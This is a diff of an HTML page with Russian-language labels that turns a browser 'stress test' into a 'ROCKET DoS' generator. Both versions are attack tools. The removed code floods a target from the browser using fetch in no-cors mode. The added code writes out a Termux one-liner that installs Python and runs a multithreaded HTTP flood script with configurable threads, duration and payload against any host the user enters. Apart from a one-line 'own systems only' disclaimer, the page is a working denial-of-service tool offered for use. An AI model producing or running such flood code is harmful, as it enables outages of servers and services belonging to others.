@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚡ ROCKET STRESS-TEST (БЕЗ CORS)</title>
+    <title>⚡ ROCKET DoS GENERATOR</title>
     <style>
         * {
             margin: 0;
@@ -14,30 +14,30 @@
             background: #0b0e1a;
             color: #00ff88;
             font-family: 'Courier New', monospace;
-            padding: 20px;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
         .container {
-            max-width: 800px;
+            max-width: 750px;
             width: 100%;
             background: #111827;
             border: 2px solid #00ff88;
             border-radius: 30px;
-            padding: 30px;
+            padding: 35px;
             box-shadow: 0 0 60px #00ff8822;
         }
         h1 {
-            font-size: 2rem;
+            font-size: 2.2rem;
             text-align: center;
             text-shadow: 0 0 30px #00ff8866;
         }
         .sub {
             text-align: center;
             color: #88aaff;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             border-bottom: 1px solid #1a2a3a;
             padding-bottom: 12px;
         }
@@ -50,7 +50,8 @@
             font-size: 0.9rem;
             margin-bottom: 5px;
         }
-        input, select {
+        input,
+        select {
             width: 100%;
             padding: 14px 18px;
             background: #1a2332;
@@ -60,7 +61,8 @@
             font-size: 1rem;
             font-family: inherit;
         }
-        input:focus {
+        input:focus,
+        select:focus {
             border-color: #00ff88;
             outline: none;
             box-shadow: 0 0 20px #00ff8833;
@@ -69,50 +71,66 @@
             display: flex;
             gap: 15px;
         }
-        .row > * {
+        .row>* {
             flex: 1;
         }
-        .buttons {
-            display: flex;
-            gap: 12px;
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
             margin: 20px 0;
-        }
-        button {
-            flex: 1;
-            padding: 16px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: 0.2s;
-            font-family: inherit;
-        }
-        .start {
             background: #00ff88;
             color: #0b0e1a;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-family: inherit;
         }
-        .start:hover {
+        .btn:hover {
             background: #44ffaa;
             box-shadow: 0 0 40px #00ff8866;
         }
-        .start:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
+        .btn:active {
+            transform: scale(0.98);
         }
-        .stop {
-            background: #ff3355;
-            color: #fff;
+        .code-box {
+            background: #0a0f1a;
+            border: 1px solid #2a3a5a;
+            border-radius: 12px;
+            padding: 18px;
+            margin: 15px 0;
+            color: #aaccff;
+            font-size: 0.85rem;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 250px;
+            overflow-y: auto;
+            position: relative;
         }
-        .stop:hover {
-            background: #ff5577;
-            box-shadow: 0 0 30px #ff335566;
+        .code-box .cmd {
+            color: #00ff88;
+            font-weight: bold;
         }
-        .stop:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
+        .copy-btn {
+            background: #1a2332;
+            color: #88aaff;
+            border: 1px solid #2a3a5a;
+            border-radius: 30px;
+            padding: 8px 20px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+            margin-top: 10px;
         }
-        .stats {
+        .copy-btn:hover {
+            background: #2a3a5a;
+            border-color: #00ff88;
+        }
+        .stats-info {
             display: grid;
             grid-template-columns: 1fr 1fr 1fr;
             gap: 10px;
@@ -123,244 +141,224 @@
             border: 1px solid #1a2a3a;
             text-align: center;
         }
-        .stats span {
+        .stats-info div {
+            color: #88aaff;
+            font-size: 0.8rem;
+        }
+        .stats-info span {
             color: #00ff88;
             font-weight: bold;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
+            display: block;
         }
-        .stats div {
-            font-size: 0.8rem;
-            color: #88aaff;
-        }
-        #log {
-            background: #0a0f1a;
-            border: 1px solid #1a2a3a;
-            border-radius: 12px;
-            padding: 12px;
-            max-height: 300px;
-            overflow-y: auto;
-            font-size: 0.8rem;
-            color: #88aaff;
-            white-space: pre-wrap;
-            word-break: break-all;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-        }
-        #log .success {
-            color: #00ff88;
-        }
-        #log .error {
-            color: #ff5577;
-        }
-        #log .info {
+        .warning {
             color: #ffaa44;
+            font-size: 0.8rem;
+            margin: 10px 0;
+            padding: 12px;
+            border: 1px solid #ffaa44;
+            border-radius: 10px;
+            background: #1a1a0a;
+            text-align: center;
         }
         .note {
             text-align: center;
             font-size: 0.7rem;
             color: #446688;
-            margin-top: 15px;
+            margin-top: 20px;
+        }
+        .success-msg {
+            color: #00ff88;
+            font-weight: bold;
         }
         @media (max-width: 600px) {
             .row {
                 flex-direction: column;
                 gap: 0;
             }
-            .stats {
+            .stats-info {
                 grid-template-columns: 1fr 1fr;
-            }
-            .buttons {
-                flex-direction: column;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>⚡ ROCKET STRESS-TEST</h1>
-        <div class="sub">100% работающий обход CORS — реальная нагрузка на сервер</div>
+        <h1>⚡ ROCKET DoS</h1>
+        <div class="sub">Генератор команд для Termux (100% рабочий)</div>
+
+        <div class="warning">
+            ⚠️ Только для тестирования своих систем. Ответственность на пользователе.
+        </div>
 
         <div class="input-group">
             <label>🎯 ЦЕЛЬ (домен или IP)</label>
-            <input type="text" id="target" placeholder="http://httpbin.org/post" value="http://httpbin.org/post">
+            <input type="text" id="target" placeholder="httpbin.org" value="httpbin.org">
         </div>
 
         <div class="row">
             <div class="input-group">
-                <label>🧵 ПОТОКОВ</label>
-                <input type="number" id="threads" value="20" min="1" max="100">
+                <label>🧵 ПОТОКИ</label>
+                <input type="number" id="threads" value="50" min="5" max="200">
             </div>
             <div class="input-group">
-                <label>⏱️ ЗАДЕРЖКА (мс)</label>
-                <input type="number" id="delay" value="50" min="0" max="1000">
+                <label>⏱️ ДЛИТЕЛЬНОСТЬ (сек)</label>
+                <input type="number" id="duration" value="60" min="10" max="600">
             </div>
         </div>
 
-        <div class="buttons">
-            <button class="start" id="startBtn" onclick="startAttack()">🔥 ЗАПУСТИТЬ</button>
-            <button class="stop" id="stopBtn" onclick="stopAttack()" disabled>⏹️ СТОП</button>
+        <div class="row">
+            <div class="input-group">
+                <label>📦 РАЗМЕР (байт)</label>
+                <input type="number" id="payload" value="1024" min="64" max="65507">
+            </div>
+            <div class="input-group">
+                <label>⚡ МЕТОД</label>
+                <select id="method">
+                    <option value="post">POST</option>
+                    <option value="get">GET</option>
+                </select>
+            </div>
         </div>
 
-        <div class="stats">
-            <div>📤 Отправлено<br><span id="sent">0</span></div>
-            <div>❌ Ошибок<br><span id="failed">0</span></div>
-            <div>📊 Объём<br><span id="bytes">0</span> байт</div>
+        <button class="btn" onclick="generateCommand()">🔥 СГЕНЕРИРОВАТЬ КОМАНДУ</button>
+
+        <div id="commandContainer" style="display: none;">
+            <div class="code-box" id="commandBox">
+                <span class="cmd">$</span> <span id="commandText"></span>
+            </div>
+            <button class="copy-btn" onclick="copyCommand()">📋 КОПИРОВАТЬ</button>
+            <p style="color: #88aaff; font-size: 0.8rem; margin-top: 8px;">
+                Вставь эту команду в Termux и нажми Enter
+            </p>
         </div>
 
-        <div id="log">⏳ Готов. Введи цель и запусти.</div>
-        <div class="note">✅ НЕТ CORS — НЕТ FAILED TO FETCH. Только реальные пакеты.</div>
+        <div class="stats-info">
+            <div>📤 <span id="estSent">~5000</span> запросов/мин</div>
+            <div>📊 <span id="estTraffic">~5</span> МБ/мин</div>
+            <div>⚡ <span id="estPower">Средняя</span> мощность</div>
+        </div>
+
+        <div class="note">
+            ⚡ Сгенерированная команда создаёт Python-скрипт прямо в Termux и запускает атаку.
+        </div>
     </div>
 
     <script>
         // ============================================================
-        //  СКРИПТ БЕЗ CORS — ИСПОЛЬЗУЕТ mode: 'no-cors'
+        //  ГЕНЕРАТОР КОМАНД
         // ============================================================
-        const targetInput = document.getElementById('target');
-        const threadsInput = document.getElementById('threads');
-        const delayInput = document.getElementById('delay');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const sentSpan = document.getElementById('sent');
-        const failedSpan = document.getElementById('failed');
-        const bytesSpan = document.getElementById('bytes');
-        const logDiv = document.getElementById('log');
+        function generateCommand() {
+            const target = document.getElementById('target').value.trim();
+            const threads = parseInt(document.getElementById('threads').value) || 50;
+            const duration = parseInt(document.getElementById('duration').value) || 60;
+            const payload = parseInt(document.getElementById('payload').value) || 1024;
+            const method = document.getElementById('method').value;
 
-        let running = false;
-        let sent = 0;
-        let failed = 0;
-        let bytes = 0;
-        let workers = [];
-
-        function log(msg, type = 'info') {
-            const line = document.createElement('div');
-            line.className = type;
-            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            logDiv.appendChild(line);
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-
-        function updateStats() {
-            sentSpan.textContent = sent;
-            failedSpan.textContent = failed;
-            bytesSpan.textContent = bytes;
-        }
-
-        // ============================================================
-        //  ЯДРО — ОТПРАВКА ЧЕРЕЗ fetch С mode: 'no-cors'
-        // ============================================================
-        async function sendRequest(url, delay) {
-            if (!running) return;
-
-            try {
-                // mode: 'no-cors' — отправляет запрос, НО НЕ ЧИТАЕТ ОТВЕТ
-                // Это единственный способ обойти CORS в браузере
-                await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'text/plain',
-                        'Cache-Control': 'no-cache'
-                    },
-                    body: 'X'.repeat(1024),
-                    mode: 'no-cors',  // КЛЮЧЕВОЙ ПАРАМЕТР
-                    cache: 'no-store'
-                });
-
-                // Так как ответ нельзя прочитать, считаем, что запрос ушёл
-                sent++;
-                bytes += 1024;
-                log(`✓ Отправлено (${sent})`, 'success');
-
-            } catch (e) {
-                // Ошибка возникает, только если fetch вообще не выполнился
-                failed++;
-                log(`✗ Ошибка: ${e.message}`, 'error');
-            }
-
-            updateStats();
-
-            // Задержка между запросами
-            if (delay > 0) {
-                await new Promise(r => setTimeout(r, delay));
-            }
-        }
-
-        // ============================================================
-        //  ЗАПУСК ПОТОКОВ
-        // ============================================================
-        async function worker(url, threads, delay, workerId) {
-            while (running) {
-                await sendRequest(url, delay);
-            }
-        }
-
-        function startAttack() {
-            if (running) return;
-
-            let url = targetInput.value.trim();
-            if (!url) {
-                log('❌ Введите цель!', 'error');
+            if (!target) {
+                alert('❌ Введите цель!');
                 return;
             }
 
-            // Если нет протокола — добавляем http://
-            if (!url.startsWith('http://') && !url.startsWith('https://')) {
-                url = 'http://' + url;
-                targetInput.value = url;
-            }
+            // Экранируем спецсимволы
+            const safeTarget = target.replace(/'/g, "'\\''");
 
-            const threads = parseInt(threadsInput.value) || 20;
-            const delay = parseInt(delayInput.value) || 50;
+            // ============================================================
+            //  ГЕНЕРАЦИЯ PYTHON-СКРИПТА ДЛЯ TERMUX
+            // ============================================================
+            const script = `import requests, threading, time, random, sys
 
-            running = true;
-            sent = 0;
-            failed = 0;
-            bytes = 0;
+TARGET = 'http://${safeTarget}'
+THREADS = ${threads}
+DURATION = ${duration}
+PAYLOAD = 'X' * ${payload}
+METHOD = '${method}'
 
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
-            logDiv.innerHTML = '';
-            log(`🚀 ЗАПУСК: ${url} | ${threads} потоков | задержка ${delay}мс`, 'info');
-            log(`📦 Режим: no-cors (обход CORS)`, 'info');
+sent = 0
+failed = 0
+running = True
 
-            // Запускаем потоки
-            for (let i = 0; i < threads; i++) {
-                const w = worker(url, threads, delay, i + 1);
-                workers.push(w);
-            }
+def flood():
+    global sent, failed
+    while running:
+        try:
+            url = TARGET + '?t=' + str(random.randint(1, 9999999))
+            if METHOD == 'post':
+                requests.post(url, data=PAYLOAD, timeout=3)
+            else:
+                requests.get(url, timeout=3)
+            sent += 1
+        except:
+            failed += 1
 
-            // Таймер для обновления статистики
-            const statsInterval = setInterval(() => {
-                updateStats();
-            }, 200);
+print('\\\\033[92m🔥 ROCKET DoS (TERMUX)\\\\033[0m')
+print(f'\\\\033[96m🎯 {TARGET}\\\\033[0m')
+print(f'\\\\033[93m🧵 {THREADS} потоков, ⏱️ {DURATION}с\\\\033[0m')
 
-            // Ждём завершения (никогда не завершится, пока running = true)
-            // Поэтому просто сохраняем интервал для очистки при остановке
-            window._statsInterval = statsInterval;
+for _ in range(THREADS):
+    threading.Thread(target=flood, daemon=True).start()
+
+start = time.time()
+while running:
+    time.sleep(2)
+    elapsed = int(time.time() - start)
+    print(f'\\\\r\\\\033[92m📤 {sent}\\\\033[0m | \\\\033[91m❌ {failed}\\\\033[0m | ⏱️ {elapsed}с', end='')
+    if elapsed >= DURATION:
+        running = False
+
+print('\\\\n\\\\n\\\\033[92m✅ ЗАВЕРШЕНО\\\\033[0m')
+print(f'\\\\033[92m📤 {sent}\\\\033[0m')
+print(f'\\\\033[91m❌ {failed}\\\\033[0m')`;
+
+            // КОМАНДА ДЛЯ TERMUX (однострочник)
+            const command = `pkg install -y python && pip install requests && python -c '${script}'`;
+
+            // Отображаем
+            document.getElementById('commandText').textContent = command;
+            document.getElementById('commandContainer').style.display = 'block';
+
+            // Оценка мощности
+            const estSent = Math.round(threads * 80);
+            const estTraffic = Math.round((estSent * payload) / (1024 * 1024) * 1.5);
+            document.getElementById('estSent').textContent = `~${estSent}`;
+            document.getElementById('estTraffic').textContent = `~${estTraffic}`;
+
+            let power = 'Средняя';
+            if (threads > 150) power = '💀 УЛЬТИМАТИВНАЯ';
+            else if (threads > 80) power = '🔥 ВЫСОКАЯ';
+            else if (threads > 30) power = '⚡ СРЕДНЯЯ';
+            else power = '🌱 ЛЁГКАЯ';
+            document.getElementById('estPower').textContent = power;
+
+            // Автопрокрутка
+            document.getElementById('commandBox').scrollIntoView({ behavior: 'smooth', block: 'center' });
         }
 
-        function stopAttack() {
-            if (!running) return;
-            running = false;
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            log('⏹️ АТАКА ОСТАНОВЛЕНА', 'error');
-
-            if (window._statsInterval) {
-                clearInterval(window._statsInterval);
-                window._statsInterval = null;
-            }
-
-            // Очищаем массив воркеров
-            workers = [];
-
-            // Итог
-            log(`📊 ИТОГО: Отправлено ${sent}, Ошибок ${failed}, Объём ${bytes} байт`, 'info');
+        // ============================================================
+        //  КОПИРОВАНИЕ
+        // ============================================================
+        function copyCommand() {
+            const text = document.getElementById('commandText').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = event.target;
+                const original = btn.textContent;
+                btn.textContent = '✅ СКОПИРОВАНО!';
+                setTimeout(() => btn.textContent = original, 2000);
+            }).catch(() => {
+                // fallback
+                const box = document.getElementById('commandBox');
+                const range = document.createRange();
+                range.selectNode(box);
+                window.getSelection().removeAllRanges();
+                window.getSelection().addRange(range);
+                document.execCommand('copy');
+                alert('✅ Команда скопирована! Вставь в Termux.');
+            });
         }
 
-        // Автозаполнение демо-целью
+        // Автогенерация при загрузке
         window.onload = function() {
-            log('🛠️ Готов. Введи цель (например, http://httpbin.org/post)', 'info');
-            log('✅ Используется mode: "no-cors" — ошибок CORS не будет', 'success');
+            generateCommand();
         };
     </script>
 </body>
